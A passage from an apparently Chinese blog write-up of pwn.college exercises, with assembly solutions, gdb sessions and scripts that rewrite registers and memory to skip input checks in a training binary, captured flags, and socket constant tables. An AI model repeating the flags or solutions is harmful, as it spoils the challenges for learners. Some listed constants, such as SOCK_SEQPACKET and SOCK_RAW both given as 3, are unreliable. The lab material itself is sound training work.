class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbx</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x8</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jg</span> loop_end<br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol">loop_end:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">div</span> <span class="hljs-built_in">rbx</span><br>    <br></code></pre></td></tr></table></figure><blockquote><p>依然是要注意<code>[]</code>的使用，要认知是取内存指向的值，还是取内存进行加减。</p></blockquote><h4 id="28-count-non-zero"><a href="#28-count-non-zero" class="headerlink" title="28. count-non-zero"></a>28. count-non-zero</h4><p>感觉主要问题是，我没理解题目的意思。理解后就很简单了。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> loop_end<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, [<span class="hljs-built_in">rdi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> loop_end<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop_end:</span><br><br></code></pre></td></tr></table></figure><h4 id="29-string-lower"><a href="#29-string-lower" class="headerlink" title="29. string lower"></a>29. string lower</h4><p>这个还行，一遍过了。还记得系统调用的时候，第一个参数是用<code>rdi</code>存储，第二个参数是用<code>rsi</code>存储</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">jne</span> loop_start<br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>, [<span class="hljs-built_in">rdi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">cl</span>, <span class="hljs-number">0x00</span><br>    <span class="hljs-keyword">je</span> done<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">cl</span>, <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">jle</span> exe_1<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol">exe_1:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x403000</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>]<br>    <span class="hljs-keyword">call</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol">done:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">ret</span><br><br></code></pre></td></tr></table></figure><h4 id="30-most-common-byte"><a href="#30-most-common-byte" class="headerlink" title="30. most-common-byte"></a>30. most-common-byte</h4><p>这道题卡了半天吧得，主要是对寄存器不熟悉，重复用了一些寄存器，然后导致出现问题，后面用普通寄存器<code>r8~15</code>解决的，普通寄存器也得用，不然变量不够存的。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0x200</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop_count_bytes:</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jge</span> loop_count_bytes_end<br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>, [<span class="hljs-built_in">rdi</span> + <span class="hljs-built_in">rcx</span>]<br>    <span class="hljs-keyword">movzx</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">dl</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">jmp</span> loop_count_bytes<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop_count_bytes_end:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop_find_max:</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">jg</span> loop_find_max_end<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8b</span>, [<span class="hljs-built_in">rbx</span>]<br>    <span class="hljs-keyword">movzx</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">r8b</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rdx</span><br>    <span class="hljs-keyword">jle</span> skip_update<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">jmp</span> loop_find_max<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">skip_update:</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">jmp</span> loop_find_max<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">loop_find_max_end:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">ret</span><br><br></code></pre></td></tr></table></figure><h3 id="Debugging-Refresher"><a href="#Debugging-Refresher" class="headerlink" title="Debugging Refresher"></a>Debugging Refresher</h3><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>直接run一下，再continue一下就好了，gdb的简单使用</p><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix">(gdb) p<span class="hljs-symbol">/x</span> $r12<br>$<span class="hljs-number">2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x18215a7f83c98b8e<br>(gdb) c<br>Continuing.<br>Random <span class="hljs-params">value:</span> <span class="hljs-number">0</span>x18215a7f83c98b8e<br>You <span class="hljs-params">input:</span> <span class="hljs-number">18215</span>a7f83c98b8e<br>The correct answer <span class="hljs-params">is:</span> <span class="hljs-number">18215</span>a7f83c98b8e<br>You win<span class="hljs-operator">!</span> Here is your <span class="hljs-params">flag:</span><br>pwn.college&#123;ETe5riLiwE1X6xz1M0yCPK4-<span class="hljs-number">4</span>WH.<span class="hljs-number">0</span>VN0IDLxYTN1YzW&#125;<br></code></pre></td></tr></table></figure><h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>通过在read处打断点，然后执行到read函数时，查看寄存器信息。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">(gdb) info registers <br><span class="hljs-built_in">rax</span>            <span class="hljs-number">0x7fff17b9e998</span>      <span class="hljs-number">140733591447960</span><br><span class="hljs-built_in">rbx</span>            <span class="hljs-number">0x5f31bbc71d10</span>      <span class="hljs-number">104667208424720</span><br><span class="hljs-built_in">rcx</span>            <span class="hljs-number">0x3</span>                 <span class="hljs-number">3</span><br><span class="hljs-built_in">rdx</span>            <span class="hljs-number">0x8</span>                 <span class="hljs-number">8</span><br><span class="hljs-built_in">rsi</span>            <span class="hljs-number">0x7fff17b9e998</span>      <span class="hljs-number">140733591447960</span><br><span class="hljs-built_in">rdi</span>            <span class="hljs-number">0x3</span>                 <span class="hljs-number">3</span><br><span class="hljs-built_in">rbp</span>            <span class="hljs-number">0x7fff17b9e9b0</span>      <span class="hljs-number">0x7fff17b9e9b0</span><br><span class="hljs-built_in">rsp</span>            <span class="hljs-number">0x7fff17b9e968</span>      <span class="hljs-number">0x7fff17b9e968</span><br><span class="hljs-built_in">r8</span>             <span class="hljs-number">0x3d</span>                <span class="hljs-number">61</span><br><span class="hljs-built_in">r9</span>             <span class="hljs-number">0x2c</span>                <span class="hljs-number">44</span><br><span class="hljs-built_in">r10</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0</span><br><span class="hljs-built_in">r11</span>            <span class="hljs-number">0x246</span>               <span class="hljs-number">582</span><br><span class="hljs-built_in">r12</span>            <span class="hljs-number">0x5f31bbc712a0</span>      <span class="hljs-number">104667208422048</span><br><span class="hljs-built_in">r13</span>            <span class="hljs-number">0x7fff17b9eaa0</span>      <span class="hljs-number">140733591448224</span><br><span class="hljs-built_in">r14</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0</span><br><span class="hljs-built_in">r15</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0</span><br><span class="hljs-built_in">rip</span>            <span class="hljs-number">0x5f31bbc71210</span>      <span class="hljs-number">0x5f31bbc71210</span> &lt;read@plt&gt;<br>eflags         <span class="hljs-number">0x202</span>               [ IF ]<br></code></pre></td></tr></table></figure><p><code>rsi</code>作为read系统调用的buf参数，所以在随机数被set后，读取这个地址的值即可。（我发现不能断点给到read函数，因为从main中执行到read的时候，有其他函数会调用read，然后就会导致它read一直失败报错）</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gams">(gdb) c<br>Continuing.<br>The random value has been <span class="hljs-keyword">set</span>!<br><br><br>Program <span class="hljs-comment">received signal SIGTRAP, Trace</span>/breakpoint trap.<br><span class="hljs-number">0x00005f31bbc71c64</span> in main ()<br>(gdb) x /<span class="hljs-comment">8x 0x7fff17b9e998</span><br>0x7fff17b9e998: 0xd81c082e      <span class="hljs-comment">0xc0e7d841      0x17b9eaa0      0x00007fff</span><br>0x7fff17b9e9a8: 0x34e94700      <span class="hljs-comment">0xa2fdab81      0x00000000      0x00000000</span><br>(gdb) c<br>Continuing.<br>Random <span class="hljs-comment">value: c0e7d841d81c082e</span><br>You <span class="hljs-comment">input: c0e7d841d81c082e</span><br>The <span class="hljs-comment">correct answer is: c0e7d841d81c082e</span><br>You <span class="hljs-comment">win! Here is your flag:</span><br><br>Breakpoint <span class="hljs-comment">1, 0x00005f31bbc71210 in read@plt ()</span><br>(gdb) c<br>Continuing.<br>pwn.college&#123;s102MI2GzaSB-30x2SjuMIlWzDy.0lN0IDLxYTN1YzW&#125;<br><br><br>[Inferior <span class="hljs-comment">1 (process 4714) exited normally]</span><br></code></pre></td></tr></table></figure><p>没毛病！至于为什么这个随机值是反着的，存储的是小端序，手动改成大端序才行。而且输出是以4字节为单位的，所以只需要将八字节反向一下即可。类似地，以一个字节为单位输出，也可以手动转换</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">(gdb) x /8x <span class="hljs-number">0x7ffccd2aa938</span><br><span class="hljs-number">0x7ffccd2aa938</span>: <span class="hljs-number">0x30</span>    <span class="hljs-number">0xe5</span>    <span class="hljs-number">0x4d</span>    <span class="hljs-number">0x5b</span>    <span class="hljs-number">0xce</span>    <span class="hljs-number">0xe0</span>    <span class="hljs-number">0x9a</span>    <span class="hljs-number">0x51</span><br>(gdb) 519ae0ce5b4de530<br></code></pre></td></tr></table></figure><p>**PS：**在后续的学习中，发现可以使用x&#x2F;gx 以8字节为单位输出</p><h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><p>我也不知道是不是我第三关的方法用错了，第四关就是使用第三关的方法，一直重复，一直读取read系统调用时<code>rsi</code>寄存器的那个地址，并且在<code>scanf</code>系统调用前打个断点，这样方便我们读取这个随机值。重复5次还是几次就能拿到flag了。</p><h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><p>使用gdb脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">start</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">704</span><br>commands<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rsi_buf</span> = <span class="hljs-variable">$rsi</span><br>    printf <span class="hljs-string">&quot;buf_addr value: %llx\n&quot;</span>, <span class="hljs-variable">$rsi_buf</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">752</span><br>commands<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$local_variable</span> = *(unsigned long long*)(<span class="hljs-variable">$rsi_buf</span>)<br>    printf <span class="hljs-string">&quot;Random value: %llx\n&quot;</span>, <span class="hljs-variable">$local_variable</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>呃，这个脚本不是完全的自动化，但是手动复制输入给程序，重复几次后就能获得到flag了。但是实际上应该是可以做到自动化输入的，或许可以借助python脚本来写，或者直接改内存。</p><h4 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h4><p>改寄存器的值做不到哇，<code>scanf</code>函数是通过调用多次<code>read</code>系统调用，每次都只写入<strong>1个字节</strong></p><p>我麻了，尝试那么多次。实际上应该跳过scanf,而不是重定向标准输入。只需要获取scanf所读取的内存地址，在这个地址将那个随机值放进去，然后控制<code>rip</code>寄存器，跳过scanf就好了。用一下exp会出现一个问题：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs powershell">run<br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">572</span><br>commands<br>    silent<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rsi_buf</span> = <span class="hljs-variable">$rsi</span><br>    printf <span class="hljs-string">&quot;buf_addr value: %llx\n&quot;</span>, <span class="hljs-variable">$rsi_buf</span><br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">606</span><br>commands<br>    silent<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$local_variable</span> = *(uint64_t*)(<span class="hljs-variable">$rsi_buf</span>)<br>    printf <span class="hljs-string">&quot;Random value: %llx\n&quot;</span>, <span class="hljs-variable">$local_variable</span><br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rbp</span><br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rip</span>=<span class="hljs-variable">$rip</span> + <span class="hljs-number">0</span>x18<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">637</span><br>commands<br>    ptype <span class="hljs-variable">$rsi</span><br>    ptype <span class="hljs-variable">$local_variable</span><br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rsi</span>=<span class="hljs-variable">$local_variable</span><br>    info registers<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241030201710671.png" class="" title="image-20241030201710671"><p>我仅仅修改了printf的内存，导致它输出的内容是一致的，但是后续的cmp指令所比较的，还是取的<code>rbp-0x18</code>地址的内容，这个内容我并没有修改，所以认定为不匹配。我直接修改<code>rbp-0x18</code>地址的内容为这个随机值即可。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell">run<br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">572</span><br>commands<br>    silent<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rsi_buf</span> = <span class="hljs-variable">$rsi</span><br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">606</span><br>commands<br>    silent<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$local_variable</span> = *(uint64_t*)(<span class="hljs-variable">$rsi_buf</span>)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rbp</span><br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rip</span>=<span class="hljs-variable">$rip</span> + <span class="hljs-number">0</span>x18<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">630</span><br>commands<br>    silent<br>    <span class="hljs-built_in">set</span> *(uint64_t*)(<span class="hljs-variable">$rbp</span><span class="hljs-literal">-0x10</span>) = <span class="hljs-variable">$local_variable</span><br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>OK，自动化成功！</p><h4 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">(gdb) call (void)<span class="hljs-built_in">win</span>()<br>You win! Here is your flag:<br>pwn.college&#123;kS6uX4HwFALgoHPYfILQokDmQwX<span class="hljs-selector-class">.0FM1IDLxYTN1YzW</span>&#125;<br></code></pre></td></tr></table></figure><p>gdb直接可以调用函数，其实在前面的关卡，我看到有个win函数，就修改过rip寄存器跳到win函数，直接能够获取flag。不过还是一步步做收获大些。毕竟这flag啥也不是</p><h4 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h4><p>因为程序是被损坏了，但是我认为<code>open</code>,<code>read</code>等系统调用应该都挺重要的，所以直接jump过去执行，单步执行来到<code>write</code>后就拿到flag了。</p><p>入口是从<code>win+47</code>位置开始的。</p><h3 id="Building-a-Web-Server"><a href="#Building-a-Web-Server" class="headerlink" title="Building a Web Server"></a>Building a Web Server</h3><h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1"></a>level1</h4><p>正常的exit汇编</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br></code></pre></td></tr></table></figure><h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><p>要实现socket，其系统调用为41。原型<code>int socket(int domain, int type, int protocol);</code></p><p><code>socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</code></p><p>也就是说，domain为<code>AF_INET</code>，type为<code>SOCK_STREAM</code>，protocol为<code>IPPROTO_IP</code></p><p>其中，关于第一个参数说明如下：</p><ul><li><strong><code>AF_INET</code> (2):</strong> IPv4 地址族。</li><li><strong><code>AF_INET6</code> (10):</strong> IPv6 地址族。</li><li><strong><code>AF_UNIX</code> (1):</strong> Unix 套接字。 这些套接字用于进程间通信，通常在本地主机上使用。 它们不是基于网络的。</li><li><strong><code>AF_BLUETOOTH</code> (12):</strong> 用于蓝牙通信的套接字类型。</li><li><strong><code>AF_PACKET</code> (17):</strong> 允许应用程序访问底层网络帧。</li><li><strong><code>AF_NETLINK</code> (16):</strong> 用于内核模块和用户空间进程之间的消息传递。</li><li><strong><code>AF_AX25</code> (11):</strong> 用于 AX.25 协议的套接字类型。</li><li><strong><code>AF_X25</code> (15):</strong> 用于 X.25 协议的套接字类型。</li><li><strong><code>AF_ATMPVC</code> (21):</strong> 用于 ATM (Asynchronous Transfer Mode) 协议的虚拟通道 (PVC)。</li><li><strong><code>AF_APPLETALK</code> (23):</strong> 用于 AppleTalk 协议的套接字类型。</li><li><strong><code>AF_NETBIOS</code> (24):</strong> 用于 NetBIOS 协议的套接字类型。</li></ul><p>关于第二个参数说明如下：</p><ul><li><strong><code>SOCK_STREAM</code> (1):</strong> 面向连接的流式套接字。数据被可靠地传输，以字节流的形式发送，顺序保证。 这类似于 TCP。</li><li><strong><code>SOCK_DGRAM</code> (2):</strong> 无连接的数据报套接字。数据包可能会丢失或顺序颠倒。 这类似于 UDP。 数据被发送成独立的数据报，没有可靠性保证。</li><li><strong><code>SOCK_SEQPACKET</code> (3):</strong> 面向连接的序列包套接字。它试图提供 TCP 的可靠性但不需要三次握手，在某些情况下性能更好。 这种类型比较少见。</li><li><strong><code>SOCK_RAW</code> (3):</strong> 原始套接字。允许应用程序访问底层网络协议。程序员可以访问网络协议的详细信息，控制传输的整个过程。这需要对网络协议有深入的了解，使用风险比较高。</li></ul><p>关于第三个参数说明如下：</p><ul><li><strong><code>IPPROTO_IP</code> (0):</strong> IP 协议。 这个值通常在使用 TCP 或 UDP 时使用，因为它在底层协议栈中就已经存在了。 它不是一个独立的协议，而是 IP 协议栈的一部分。</li><li><strong><code>IPPROTO_TCP</code> (6):</strong> 传输控制协议 (TCP)。 这指定了使用 TCP 协议。</li><li><strong><code>IPPROTO_UDP</code> (17):</strong> 用户数据报协议 (UDP)。 这指定了使用 UDP 协议。</li><li><strong><code>IPPROTO_ICMP</code> (1):</strong> 因特网控制消息协议 (ICMP)。 ICMP 用于错误报告和查询。</li><li><strong><code>IPPROTO_IGMP</code> (2):</strong> 因特网组管理协议 (IGMP)。 IGMP 用于多播。</li><li><strong><code>IPPROTO_IPIP</code> (4):</strong> IP over IP。 这允许一个 IP 数据报封装在另一个 IP 